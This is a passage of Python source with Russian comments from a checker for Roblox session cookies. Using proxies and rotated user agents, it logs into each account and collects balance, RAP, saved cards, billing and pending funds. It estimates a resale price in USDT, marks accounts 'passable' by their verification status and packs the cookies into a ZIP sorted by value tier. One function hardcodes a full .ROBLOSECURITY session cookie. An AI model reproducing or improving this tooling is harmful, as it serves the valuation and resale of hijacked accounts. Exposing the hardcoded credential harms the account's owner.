                await self.get_age_verification(session, cookie, proxy_url, result)

            # Проверка страны
            async with session.get(
                "https://accountsettings.roblox.com/v1/account/settings/account-country",
                cookies={'.ROBLOSECURITY': cookie},
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    logging.info(f"🌍 Country API response: {data}")
                    country_name = None
                    # Пробуем разные структуры ответа — приоритет у countryCode (2-буквенный код)
                    if isinstance(data, dict):
                        country_name = (
                            data.get('countryCode') or
                            data.get('countryName') or
                            data.get('localizedName') or
                            data.get('name') or
                            data.get('country')
                        )
                        if not country_name:
                            value = data.get('value', {})
                            if isinstance(value, dict):
                                country_name = (
                                    value.get('countryCode') or
                                    value.get('countryName') or
                                    value.get('localizedName') or
                                    value.get('name')
                                )
                            elif isinstance(value, str) and value:
                                country_name = value
                    if country_name:
                        result['country'] = country_name
                        logging.info(f"🌍 Страна: {result['country']}")
                    else:
                        result['country'] = 'Unknown'
                        logging.warning(f"⚠️ Не удалось извлечь страну из: {data}")
                else:
                    result['country'] = 'Unknown'
                    logging.warning(f"⚠️ Ошибка получения страны: статус {resp.status}")
            # Проверка настроек торговли
            async with session.get(
                f"https://accountsettings.roblox.com/v1/trade-privacy",
                cookies={'.ROBLOSECURITY': cookie},
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result['trade'] = data.get('tradePrivacy', 'NoOne') != 'NoOne'
                    logging.info(f"💱 Торговля: {'✅' if result['trade'] else '❌'}")
          
        except aiohttp.ClientConnectorError as e:
            # ИСПРАВЛЕНИЕ: Специальная обработка DNS/resolve ошибок
            error_str = str(e).lower()
            if "resolve hostname" in error_str or "name or service not known" in error_str or "failed to resolve" in error_str:
                logging.warning(f"🚫 DNS-ошибка (resolve hostname) для additional_info — пропускаем: {str(e)}")
                result['country'] = 'Unknown'
                result['age_verified'] = 0
                result['trade'] = False
                return
            logging.error("❌ Таймаут при получении дополнительной информации")
            result['country'] = 'Unknown'
            result['age_verified'] = 0
            result['trade'] = False
        except Exception as e:
            logging.error(f"❌ Ошибка дополнительной информации: {str(e)}")
            result['country'] = 'Unknown'
            result['age_verified'] = 0
            result['trade'] = False
    def compute_summary(self, total: int, valid_stats: List[Dict], selected_checks: Dict[str, bool]) -> Dict:
        valid = len(valid_stats)
        invalid = total - valid
        summary = {
            'total': total, 'valid': valid, 'invalid': invalid,
        }
        if not valid_stats:
            return summary
        # Оценка стоимости всей пачки (USDT)
        summary['sum_price'] = round(sum(d.get('price', 0) or 0 for d in valid_stats), 2)
        summary['max_price'] = round(max((d.get('price', 0) or 0) for d in valid_stats), 2)
        summary['priced_accounts'] = len([d for d in valid_stats if (d.get('price', 0) or 0) > 0])
        if selected_checks.get('places_visits', False):
            summary['sum_visits'] = sum(d.get('places_visits', 0) for d in valid_stats)
            summary['max_visits'] = max(d.get('places_visits', 0) for d in valid_stats)
            summary['visits_accounts'] = len([d for d in valid_stats if d['places_visits'] > 0])
            summary['visits_percent'] = (summary['visits_accounts'] / valid * 100) if valid > 0 else 0
        if selected_checks.get('balance', False):
            summary['sum_balance'] = sum(d.get('balance', 0) for d in valid_stats)
            summary['max_balance'] = max(d.get('balance', 0) for d in valid_stats)
            summary['balance_accounts'] = len([d for d in valid_stats if d['balance'] > 0])
            summary['balance_percent'] = (summary['balance_accounts'] / valid * 100) if valid > 0 else 0
        if selected_checks.get('pending', False):
            summary['sum_pending'] = sum(d.get('pending', 0) for d in valid_stats)
            summary['max_pending'] = max(d.get('pending', 0) for d in valid_stats)
        if selected_checks.get('donate_year', False):
            donate_year_values = [max(0, d.get('donate_year', 0)) for d in valid_stats]
            summary['sum_donate_year'] = sum(donate_year_values)
            summary['max_donate_year'] = max(donate_year_values) if donate_year_values else 0
            summary['donate_accounts'] = len([d for d in valid_stats if d['donate_year'] > 0])
            summary['donate_percent'] = (summary['donate_accounts'] / valid * 100) if valid > 0 else 0
        if selected_checks.get('donate_lifetime', False):
            summary['sum_donate_lifetime'] = sum(d.get('donate_lifetime', 0) for d in valid_stats)
            summary['max_donate_lifetime'] = max(d.get('donate_lifetime', 0) for d in valid_stats)
        if selected_checks.get('rap', False):
            summary['sum_rap'] = sum(d.get('rap', 0) for d in valid_stats)
            summary['max_rap'] = max(d.get('rap', 0) for d in valid_stats)
        if selected_checks.get('billing', False):
            billing_usd_values = [d.get('billing_usd', 0) for d in valid_stats]
            summary['sum_billing_usd'] = sum(billing_usd_values)
            summary['max_billing_usd'] = max(billing_usd_values) if billing_usd_values else 0
            # ДОБАВЛЯЕМ сумму в робуксах для отчета
            billing_robux_values = [d.get('billing_robux', 0) for d in valid_stats]
            summary['sum_billing_robux'] = sum(billing_robux_values)
            summary['max_billing_robux'] = max(billing_robux_values) if billing_robux_values else 0
        if selected_checks.get('premium', False):
            summary['prem_count'] = sum(1 for d in valid_stats if d.get('prem', False))
        if selected_checks.get('card', False):
            summary['card_count'] = sum(d.get('card', 0) for d in valid_stats)
        if selected_checks.get('email_verified', False):
            summary['no_email_count'] = sum(1 for d in valid_stats if not d.get('email_verified', True))
        if selected_checks.get('groups_balance', False):
            summary['sum_groups_balance'] = sum(d.get('groups_balance', 0) for d in valid_stats)
        if selected_checks.get('places_visits', False):
            summary['sum_visits'] = sum(d.get('places_visits', 0) for d in valid_stats)
        if selected_checks.get('rares', False):
            summary['sum_rare'] = sum(d.get('rare_count', 0) for d in valid_stats)
            summary['korblox_count'] = sum(1 for d in valid_stats if d.get('korblox', False))
            summary['headless_count'] = sum(1 for d in valid_stats if d.get('headless', False))
        if selected_checks.get('badges', False):
            summary['sum_badges'] = sum(sum(v.get('count', 0) for v in d.get('badges_count_per_game', {}).values()) for d in valid_stats) # ИСПРАВЛЕНИЕ: sum counts
        if selected_checks.get('gamepasses', False):
            summary['sum_gamepasses'] = sum(sum(v.get('count', 0) for v in d.get('gamepasses_count_per_game', {}).values()) for d in valid_stats) # ИСПРАВЛЕНИЕ: sum counts
        if selected_checks.get('passable', False):
            summary['passable_count'] = sum(1 for d in valid_stats if not self.is_unpassable(d))
            summary['unpassable_count'] = sum(1 for d in valid_stats if self.is_unpassable(d))
        if selected_checks.get('rare_items_check', False):
            summary['rare_items_accounts'] = sum(1 for d in valid_stats if d.get('rare_items'))
        return summary
    def compute_game_donate_summary(self, stats: List[Dict]) -> Dict:
        summary = defaultdict(int)
        for stat in stats:
            for name, data in stat.get('game_donates', {}).items():
                summary[name] += data['sum']
        return dict(summary)

    def compute_playtime_summary(self, stats: List[Dict]) -> Dict:
        summary = defaultdict(int)
        for stat in stats:
            for name, minutes in stat.get('playtime_minutes', {}).items():
                summary[name] += minutes
        return dict(summary)
    def generate_stats_html(self, summary: Dict, valid_stats: List[Dict], game_summary: Dict, 
                    selected_checks: Dict[str, bool], playtime_summary: Dict) -> str:
        valid = summary['valid']
        donate_accounts = len([d for d in valid_stats if d.get('donate_lifetime', 0) > 0])
        donate_percent = (donate_accounts / valid * 100) if valid > 0 else 0
        balance_accounts = summary.get('balance_accounts', 0)
        balance_percent = summary.get('balance_percent', 0.0)
        sum_balance = f"{summary.get('sum_balance', 0):,}"
        sum_donate_year = f"{summary.get('sum_donate_year', 0):,}"
        sum_donate_lifetime = f"{summary.get('sum_donate_lifetime', 0):,}"
        sum_pending = f"{summary.get('sum_pending', 0):,}"
        sum_rap = f"{summary.get('sum_rap', 0):,}"
        sum_billing_usd = summary.get('sum_billing_usd', 0)
        sum_billing_robux = f"{sum_billing_usd:,}"
        card_count = f"{summary.get('card_count', 0):,}"
        prem_count = f"{summary.get('prem_count', 0):,}"
        korblox_count = f"{summary.get('korblox_count', 0):,}"
        headless_count = f"{summary.get('headless_count', 0):,}"
        sum_badges = f"{summary.get('sum_badges', 0):,}"
        sum_gamepasses = f"{summary.get('sum_gamepasses', 0):,}"
        sum_groups_balance = f"{summary.get('sum_groups_balance', 0):,}"
        sum_visits = f"{summary.get('sum_visits', 0):,}"  # НОВОЕ: сумма визитов
        sum_price = summary.get('sum_price', 0)
        current_time = datetime.now().strftime("%d.%m.%Y %H:%M")

        has_total_values = False
        total_headers = ""
        total_values = ""

        # Оценка стоимости всей пачки — первой колонкой (если галка Price вкл)
        if selected_checks.get('price', True) and sum_price and sum_price > 0:
            total_headers += "<th>Price (USDT)</th>"
            total_values += f"<td class=\"highlight\">~{sum_price:,}</td>"
            has_total_values = True

        # ДОБАВЛЕНО: Places Visits в общие значения
        if selected_checks.get('places_visits', False):
            total_headers += "<th>Places Visits</th>"
            total_values += f"<td>{sum_visits}</td>"
            has_total_values = True
        
        if selected_checks.get('balance', False):
            total_headers += "<th>Balance</th>"
            total_values += f"<td>{sum_balance}</td>"
            has_total_values = True
        if selected_checks.get('donate_year', False):
            total_headers += "<th>1-Year donate</th>"
            total_values += f"<td>{sum_donate_year}</td>"
            has_total_values = True
        if selected_checks.get('donate_lifetime', False):
            total_headers += "<th>All-time donate</th>"
            total_values += f"<td>{sum_donate_lifetime}</td>"
            has_total_values = True
        if selected_checks.get('pending', False):
            total_headers += "<th>Pending</th>"
            total_values += f"<td>{sum_pending}</td>"
            has_total_values = True
        if selected_checks.get('rap', False):
            total_headers += "<th>Rap</th>"
            total_values += f"<td>{sum_rap}</td>"
            has_total_values = True
        if selected_checks.get('billing', False):
            total_headers += "<th>Billing</th>"
            # ИЗМЕНЕНО: показываем в робуксах
            total_values += f"<td>{summary.get('sum_billing_robux', 0):,} R$</td>"
            has_total_values = True
            has_total_values = True
        if selected_checks.get('card', False):
            total_headers += "<th>Card</th>"
            total_values += f"<td>{card_count}</td>"
            has_total_values = True
        if selected_checks.get('premium', False):
            total_headers += "<th>Premium</th>"
            total_values += f"<td>{prem_count}</td>"
            has_total_values = True
        if selected_checks.get('rares', False):
            total_headers += "<th>Korblox</th>"
            total_values += f"<td>{korblox_count}</td>"
            total_headers += "<th>Headless</th>"
            total_values += f"<td>{headless_count}</td>"
            has_total_values = True
        if selected_checks.get('badges', False):
            total_headers += "<th>Badges</th>"
            total_values += f"<td>{sum_badges}</td>"
            has_total_values = True
        if selected_checks.get('gamepasses', False):
            total_headers += "<th>Passes</th>"
            total_values += f"<td>{sum_gamepasses}</td>"
            has_total_values = True
        if selected_checks.get('groups_balance', False):
            total_headers += "<th>Groups</th>"
            total_values += f"<td>{sum_groups_balance}</td>"
            has_total_values = True

        top_headers = "<th>№</th>"

        # Цена — первой колонкой топа (если галка Price вкл и есть что оценивать)
        show_price = bool(selected_checks.get('price', True) and sum_price and sum_price > 0)
        if show_price:
            top_headers += "<th>Price (USDT)</th>"

        # ДОБАВЛЕНО: Places Visits в топ таблицу
        if selected_checks.get('places_visits', False):
            top_headers += "<th>Places Visits</th>"
        if selected_checks.get('balance', False):
            top_headers += "<th>Balance</th>"
        if selected_checks.get('donate_year', False):
            top_headers += "<th>1-Year donate</th>"
        if selected_checks.get('donate_lifetime', False):
            top_headers += "<th>All-time donate</th>"
        if selected_checks.get('pending', False):
            top_headers += "<th>Pending</th>"
        if selected_checks.get('rap', False):
            top_headers += "<th>Rap</th>"
        if selected_checks.get('card', False):
            top_headers += "<th>Card</th>"
        if selected_checks.get('badges', False):
            top_headers += "<th>Badges</th>"
        if selected_checks.get('gamepasses', False):
            top_headers += "<th>Passes</th>"
        if selected_checks.get('groups_balance', False):
            top_headers += "<th>Groups</th>"

        top_balance = sorted(valid_stats, key=lambda x: x['balance'], reverse=True)[:5] if selected_checks.get('balance', False) else []
        top_donate_year = sorted(valid_stats, key=lambda x: x['donate_year'], reverse=True)[:5] if selected_checks.get('donate_year', False) else []
        top_donate_lifetime = sorted(valid_stats, key=lambda x: x['donate_lifetime'], reverse=True)[:5] if selected_checks.get('donate_lifetime', False) else []
        top_pending = sorted(valid_stats, key=lambda x: x['pending'], reverse=True)[:5] if selected_checks.get('pending', False) else []
        top_rap = sorted(valid_stats, key=lambda x: x['rap'], reverse=True)[:5] if selected_checks.get('rap', False) else []
        top_cards = sorted(valid_stats, key=lambda x: x['card'], reverse=True)[:5] if selected_checks.get('card', False) else []
        top_badges = sorted(valid_stats, key=lambda x: sum(v.get('count', 0) for v in x.get('badges_count_per_game', {}).values()), reverse=True)[:5] if selected_checks.get('badges', False) else []
        top_gamepasses = sorted(valid_stats, key=lambda x: sum(v.get('count', 0) for v in x.get('gamepasses_count_per_game', {}).values()), reverse=True)[:5] if selected_checks.get('gamepasses', False) else []
        top_groups = sorted(valid_stats, key=lambda x: x['groups_balance'], reverse=True)[:5] if selected_checks.get('groups_balance', False) else []
        
        # ДОБАВЛЕНО: Топ по визитам
        top_visits = sorted(valid_stats, key=lambda x: x['places_visits'], reverse=True)[:5] if selected_checks.get('places_visits', False) else []

        # Топ по цене
        top_price = sorted(valid_stats, key=lambda x: x.get('price', 0) or 0, reverse=True)[:5] if show_price else []

        top_rows = ""
        for i in range(5):
            row = f"<td>{i+1}</td>"

            # Цена — первой колонкой
            if show_price:
                val = f"~{top_price[i].get('price', 0):,}" if i < len(top_price) else "0"
                row += f"<td class=\"highlight\">{val}</td>"

            # ДОБАВЛЕНО: Places Visits
            if selected_checks.get('places_visits', False):
                val = f"{top_visits[i]['places_visits']:,}" if i < len(top_visits) else "0"
                row += f"<td class=\"highlight\">{val}</td>"
            
            if selected_checks.get('balance', False):
                val = f"{top_balance[i]['balance']:,}" if i < len(top_balance) else "0"
                row += f"<td class=\"highlight\">{val}</td>"
            if selected_checks.get('donate_year', False):
                val = f"{top_donate_year[i]['donate_year']:,}" if i < len(top_donate_year) else "0"
                row += f"<td class=\"highlight\">{val}</td>"
            if selected_checks.get('donate_lifetime', False):
                val = f"{top_donate_lifetime[i]['donate_lifetime']:,}" if i < len(top_donate_lifetime) else "0"
                row += f"<td class=\"highlight\">{val}</td>"
            if selected_checks.get('pending', False):
                val = f"{top_pending[i]['pending']:,}" if i < len(top_pending) else "0"
                row += f"<td class=\"highlight\">{val}</td>"
            if selected_checks.get('rap', False):
                val = f"{top_rap[i]['rap']:,}" if i < len(top_rap) else "0"
                row += f"<td class=\"highlight\">{val}</td>"
            if selected_checks.get('card', False):
                val = f"{top_cards[i]['card']:,}" if i < len(top_cards) else "0"
                row += f"<td class=\"highlight\">{val}</td>"
            if selected_checks.get('badges', False):
                val = f"{sum(v.get('count', 0) for v in top_badges[i].get('badges_count_per_game', {}).values()):,}" if i < len(top_badges) else "0"
                row += f"<td class=\"highlight\">{val}</td>"
            if selected_checks.get('gamepasses', False):
                val = f"{sum(v.get('count', 0) for v in top_gamepasses[i].get('gamepasses_count_per_game', {}).values()):,}" if i < len(top_gamepasses) else "0"
                row += f"<td class=\"highlight\">{val}</td>"
            if selected_checks.get('groups_balance', False):
                val = f"{top_groups[i]['groups_balance']:,}" if i < len(top_groups) else "0"
                row += f"<td class=\"highlight\">{val}</td>"
            top_rows += f"<tr>{row}</tr>"

            game_headers = ""
            game_totals = ""
            top_game_headers = ""
            top_game_rows = ""
            if selected_checks.get('ingame_donate', False) and game_summary:
                sorted_games = sorted(game_summary.items(), key=lambda x: x[1], reverse=True)
                
                for game_name, total in sorted_games:
                    game_headers += f"<th>{game_name}</th>"
                    game_totals += f"<td>{total:,}</td>"
                
                top_game_headers = "<th>№</th>" + game_headers
                
                game_order = [game_name for game_name, _ in sorted_games]
                game_top_data = {}
                
                for game_name in game_order:
                    game_donates = []
                    for stat in valid_stats:
                        donate_data = stat.get('game_donates', {}).get(game_name, {})
                        if isinstance(donate_data, dict):
                            game_donates.append(donate_data.get('sum', 0))
                        else:
                            game_donates.append(donate_data)
                    
                    game_donates_sorted = sorted(game_donates, reverse=True)[:10]
                    game_top_data[game_name] = game_donates_sorted
                
                for rank in range(10):
                    row = f"<td>{rank+1}</td>"
                    for game_name in game_order:
                        if rank < len(game_top_data[game_name]):
                            val = game_top_data[game_name][rank]
                            row += f"<td>{val:,}</td>"
                        else:
                            row += "<td>—</td>"
                    top_game_rows += f"<tr>{row}</tr>"

            playtime_headers = ""
            playtime_totals = ""
            top_playtime_headers = ""
            top_playtime_rows = ""
            if selected_checks.get('playtime', False) and playtime_summary:
                sorted_playtime = sorted(playtime_summary.items(), key=lambda x: x[1], reverse=True)
                
                for game_name, total in sorted_playtime:
                    playtime_headers += f"<th>{game_name}</th>"
                    playtime_totals += f"<td>{total:,}</td>"
                
                top_playtime_headers = "<th>№</th>" + playtime_headers
                
                playtime_order = [game_name for game_name, _ in sorted_playtime]
                playtime_top_data = {}
                
                for game_name in playtime_order:
                    game_playtimes = []
                    for stat in valid_stats:
                        playtime = stat.get('playtime_minutes', {}).get(game_name, 0)
                        game_playtimes.append(playtime)
                    
                    game_playtimes_sorted = sorted(game_playtimes, reverse=True)[:10]
                    playtime_top_data[game_name] = game_playtimes_sorted
                
                for rank in range(10):
                    row = f"<td>{rank+1}</td>"
                    for game_name in playtime_order:
                        if rank < len(playtime_top_data[game_name]):
                            val = playtime_top_data[game_name][rank]
                            row += f"<td>{val:,}</td>"
                        else:
                            row += "<td>—</td>"
                    top_playtime_rows += f"<tr>{row}</tr>"

        total_values_section = f"""
            <div class="table-container">
                <h2>Total values</h2>
                <div class="table-scroll">
                    <table class="gradient-table">
                        <thead>
                            <tr>
                                {total_headers}
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                {total_values}
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        """ if has_total_values else ""

        html_content = HTML_TEMPLATE
        template_data = {
            'valid': f"{valid:,}",
            'donate_accounts': f"{donate_accounts:,}",
            'donate_percent': f"{donate_percent:.2f}",
            'balance_accounts': f"{balance_accounts:,}",
            'balance_percent': f"{balance_percent:.2f}",
            'sum_donate_lifetime': sum_donate_lifetime,
            'current_time': current_time,
            'total_values_section': total_values_section,
            'top_headers': top_headers,
            'top_rows': top_rows,
            'game_headers': game_headers,
            'game_totals': game_totals,
            'top_game_headers': top_game_headers,
            'top_game_rows': top_game_rows,
            'playtime_headers': playtime_headers,
            'playtime_totals': playtime_totals,
            'top_playtime_headers': top_playtime_headers,
            'top_playtime_rows': top_playtime_rows,
        }
        
        for key, value in template_data.items():
            html_content = html_content.replace(f'{{{key}}}', str(value))
        
        return html_content
    async def get_badge_name(self, badge_id: int, session: aiohttp.ClientSession = None) -> str:
        """Получить имя бейджа по ID: сначала из кэша, иначе API + кэш"""
        from database import get_badge_name_from_cache, cache_badge_name

        cached_name = get_badge_name_from_cache(badge_id)
        if cached_name:
            logging.debug(f"Badge {badge_id} name from cache: {cached_name}")
            return cached_name

        own_session = None
        try:
            if session is None:
                own_session = aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=_SSL_CTX),
                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                )
                session = own_session
            try:
                async with session.get(
                    f"https://badges.roblox.com/v1/badges/{badge_id}",
                    headers={"User-Agent": random.choice(USER_AGENTS)},
                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        name = data.get('name', f'Badge_{badge_id}')
                        cache_badge_name(badge_id, name)
                        logging.info(f"Badge {badge_id} name fetched and cached: {name}")
                        return name
                    else:
                        logging.warning(f"Badge API error for {badge_id}: status {response.status}")
                        return f'Badge_{badge_id}'
            finally:
                if own_session:
                    await own_session.close()
        except aiohttp.ClientConnectorError as e:
            error_str = str(e).lower()
            if "resolve hostname" in error_str or "name or service not known" in error_str or "failed to resolve" in error_str:
                logging.warning(f"🚫 DNS-ошибка для badge_name {badge_id} — возвращаем fallback: {str(e)}")
                return f'Badge_{badge_id}'
            logging.error(f"Error fetching badge name {badge_id}: {e}")
            return f'Badge_{badge_id}'
        except Exception as e:
            logging.error(f"Error fetching badge name {badge_id}: {e}")
            return f'Badge_{badge_id}'
    async def get_gamepass_name(self, gamepass_id: int, session: aiohttp.ClientSession = None) -> str:
        """Получить имя геймпасса по ID: сначала из кэша, иначе API + кэш"""
        from database import get_gamepass_name_from_cache, cache_gamepass_name

        cached_name = get_gamepass_name_from_cache(gamepass_id)
        if cached_name:
            logging.debug(f"Gamepass {gamepass_id} name from cache: {cached_name}")
            return cached_name

        cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhsKBGR1aWQSEzc4MDkyNjYzOTU1NjgzNjI3NTgoBA.YPwnyDb8UToj6JqIebJh700i1A8pVaFcBMRh4mO8QcE-SLaadS2dfq4pequf1fdEGATxnOpE3H7hZMPMmD2hq3fGCe5Hb6STeFUMMPYgONiDwluy6zRtJonkBQSoihravKRxeaIrDNYqjqqtEHcJX5pCOh55e6Q0dRHl3xgN8XgoQX3qAwslGUt9pj2ihwSNGb6poz8jWYghB1VIVtYNy7b1Mt--BR0SIJRSAq9ZxBlwMX_nvsYkHKio0INBDFNSNo1Esa0OHNnvRhu5NRay0qtoJyqycBk3fxSB3ZKMvJRiF2QHLatyrsdcWyY8n5KVjqfZuzYQ00210RavX7bXNYhStITjtqYdjvwnnN9f5EAo5Di9cYSVQuh78uW3a6lzvk7ViHSoBMVwKfXmlYtJ1kKDnttP4JoOGp5a3KF2wCPDrfoNcZXZUzvo2p-v7E2YZ2CvILHRUGZChV2XUlgRG_lC9CDNQKQqlMPBI9pSfL2lra52VkfZTCHvbYQN_3-gq9S7Yqrrj-5uCcAIwYD6WK98cy-QWegvu5bFqWKVwgXfvmQHcnBH69IU0cwa41G3T41wcv-uglJN8EG2QBoDRmkuhDdwSAt8i7TFmq8-jE-vEq1BVrOHuUF2mwNoG7ITED0niO5jHIS3cjJIUALF0YHCCVWItjg-B02qLDpzVb0_FWe99NrktfZ8q_iUakvKgBHSNni2TKlmRDX2J8ZLE0A3jxL6O9LBq-ICgViTjtOkC6mB7DxP2KpE69qsTDCfrNYwgMCh2I-JeJINTucOmjZvJs9QHtw3r6kpD3DjXOk47XWjsDdf9ZSWQr7pdBafbM39NVtaCgEHOLkZYeU2BqzmzYxm-kidLD7jw9HfiAERTsM-O2M66MVk_fqZtDov1OtIrunDWXoLV9ljmMLoU92JybIw6BhAh5_sTtGLNa4vuz6g"
        cookies = {".ROBLOSECURITY": cookie}

        own_session = None
        try:
            if session is None:
                own_session = aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=_SSL_CTX),
                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                )
                session = own_session
            try:
                async with session.get(
                    f"https://apis.roblox.com/game-passes/v1/game-passes/{gamepass_id}/details",
                    headers={"User-Agent": random.choice(USER_AGENTS)},
                    cookies=cookies,
                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        name = data.get('name', f'Gamepass_{gamepass_id}')
                        cache_gamepass_name(gamepass_id, name)
                        logging.info(f"Gamepass {gamepass_id} name fetched and cached: {name}")
                        return name
                    else:
                        logging.warning(f"Gamepass API error for {gamepass_id}: status {response.status}")
                        return f'Gamepass_{gamepass_id}'
            finally:
                if own_session:
                    await own_session.close()
        except aiohttp.ClientConnectorError as e:
            error_str = str(e).lower()
            if "resolve hostname" in error_str or "name or service not known" in error_str or "failed to resolve" in error_str:
                logging.warning(f"🚫 DNS-ошибка для gamepass_name {gamepass_id} — возвращаем fallback: {str(e)}")
                return f'Gamepass_{gamepass_id}'
            logging.error(f"Error fetching gamepass name {gamepass_id}: {e}")
            return f'Gamepass_{gamepass_id}'
        except Exception as e:
            logging.error(f"Error fetching gamepass name {gamepass_id}: {e}")
            return f'Gamepass_{gamepass_id}'
    def create_results_zip(self, valid_stats: List[Dict], selected_checks: Dict[str, bool], selected_ingame: Dict[str, bool],
                        selected_badges: Dict[str, bool], selected_gamepasses: Dict[str, bool], selected_playtime: Dict[str, bool],
                        ingame_games: dict = None, playtime_games: dict = None) -> bytes:
        if ingame_games is None:
            ingame_games = GAMES
        if playtime_games is None:
            playtime_games = GAMES

        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            use_emoji = selected_checks.get('use_emoji', True)
            
            # valids.txt
            if valid_stats:
                random.shuffle(valid_stats)
                content = '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in valid_stats)
                zipf.writestr('valids.txt', content)

            # Passable / Unpassable (по статусу age/ID верификации)
            if valid_stats and selected_checks.get('passable', False):
                unpassable_stats = [d for d in valid_stats if self.is_unpassable(d)]
                passable_stats = [d for d in valid_stats if not self.is_unpassable(d)]
                if passable_stats:
                    zipf.writestr('Passable/Passable.txt', '\n'.join(
                        self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks,
                                                selected_ingame, selected_playtime, use_emoji) for d in passable_stats))
                if unpassable_stats:
                    zipf.writestr('Unpassable/Unpassable.txt', '\n'.join(
                        self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks,
                                                selected_ingame, selected_playtime, use_emoji) for d in unpassable_stats))
                
            if selected_checks.get('places_visits', False):
                visits_stats = sorted([d for d in valid_stats if d['places_visits'] > 0], 
                                    key=lambda x: x['places_visits'], reverse=True)
                if visits_stats:
                    zipf.writestr('Visits/Visits.txt', '\n'.join(
                        self.format_cookie_line(d, selected_badges, selected_gamepasses, 
                                            selected_checks, selected_ingame, 
                                            selected_playtime, use_emoji) for d in visits_stats))
            if selected_checks.get('badges', False) or selected_checks.get('gamepasses', False):
                combined_stats = []
                for d in valid_stats:
                    # Проверяем наличие бейджей
                    has_badges = False
                    if selected_checks.get('badges', False):
                        has_badges = sum(v.get('count', 0) for v in d.get('badges_count_per_game', {}).values()) > 0
                    
                    # Проверяем наличие геймпассов
                    has_gamepasses = False
                    if selected_checks.get('gamepasses', False):
                        has_gamepasses = sum(v.get('count', 0) for v in d.get('gamepasses_count_per_game', {}).values()) > 0
                    
                    # Добавляем, если есть хотя бы что-то из выбранного
                    if (selected_checks.get('badges', False) and has_badges) or \
                    (selected_checks.get('gamepasses', False) and has_gamepasses):
                        combined_stats.append(d)
                
                if combined_stats:
                    # Сортируем по сумме бейджей и геймпассов (если оба параметра включены)
                    if selected_checks.get('badges', False) and selected_checks.get('gamepasses', False):
                        combined_stats.sort(key=lambda x: (
                            sum(v.get('count', 0) for v in x.get('badges_count_per_game', {}).values()) + 
                            sum(v.get('count', 0) for v in x.get('gamepasses_count_per_game', {}).values())
                        ), reverse=True)
                    elif selected_checks.get('badges', False):
                        combined_stats.sort(key=lambda x: sum(v.get('count', 0) for v in x.get('badges_count_per_game', {}).values()), reverse=True)
                    elif selected_checks.get('gamepasses', False):
                        combined_stats.sort(key=lambda x: sum(v.get('count', 0) for v in x.get('gamepasses_count_per_game', {}).values()), reverse=True)
                    
                    zipf.writestr('Badges+Gamepasses/Badges+Gamepasses.txt', '\n'.join(
                        self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, 
                                                selected_ingame, selected_playtime, use_emoji) 
                        for d in combined_stats
                    ))
            
            if selected_checks.get('pending', False):
                pending_stats = sorted([d for d in valid_stats if d['pending'] > 0], 
                                    key=lambda x: x['pending'], reverse=True)
                if pending_stats:
                    zipf.writestr('Pending/Pending.txt', '\n'.join(
                        self.format_cookie_line(d, selected_badges, selected_gamepasses,
                                            selected_checks, selected_ingame,
                                            selected_playtime, use_emoji) for d in pending_stats))
                    
                    pending_ranges = [
                        (1, 100, '1-100'),
                        (100, 500, '100-500'),
                        (500, 1000, '500-1k'),
                        (1000, 5000, '1k-5k'),
                        (5000, 10000, '5k-10k'),
                        (10000, 50000, '10k-50k'),
                        (50000, 100000, '50k-100k'),
                        (100000, 500000, '100k-500k'),
                        (500000, 1000000, '500k-1M'),
                        (1000000, float('inf'), '1M+')
                    ]
                    
                    for lower, upper, range_name in pending_ranges:
                        range_stats = [d for d in pending_stats if lower <= d['pending'] < upper]
                        if range_stats:
                            safe_name = range_name.replace('+', 'plus').replace('-', '_')
                            zipf.writestr(f'Pending/{safe_name}.txt', '\n'.join(
                                self.format_cookie_line(d, selected_badges, selected_gamepasses,
                                                    selected_checks, selected_ingame,
                                                    selected_playtime, use_emoji) for d in range_stats))
            
            # RAP
            if selected_checks.get('rap', False):
                rap_stats = sorted([d for d in valid_stats if d['rap'] > 0], key=lambda x: x['rap'], reverse=True)
                if rap_stats:
                    zipf.writestr('Rap/Rap.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in rap_stats))
                
                rap_tiers = [(100_000, "100k+"), (50_000, "50k+"), (25_000, "25k+"), (10_000, "10k+"), (5_000, "5k+"), (1_000, "1k+")]
                for threshold, name in rap_tiers:
                    tier_stats = [d for d in rap_stats if d['rap'] >= threshold and not any(d['rap'] >= t for t, _ in rap_tiers if t > threshold)]
                    if tier_stats:
                        zipf.writestr(f'Rap/{name}.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in tier_stats))

            # Rare Items
            if selected_checks.get('rare_items_check', False):
                rare_stats = [d for d in valid_stats if d.get('rare_items')]
                if rare_stats:
                    zipf.writestr('Rare Items/Rare Items.txt', '\n'.join(
                        self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in rare_stats))
            
            # Donate
            if selected_checks.get('donate_year', False) or selected_checks.get('donate_lifetime', False):
                donate_stats = sorted([d for d in valid_stats if d['donate_year'] > 0 or d['donate_lifetime'] > 0],
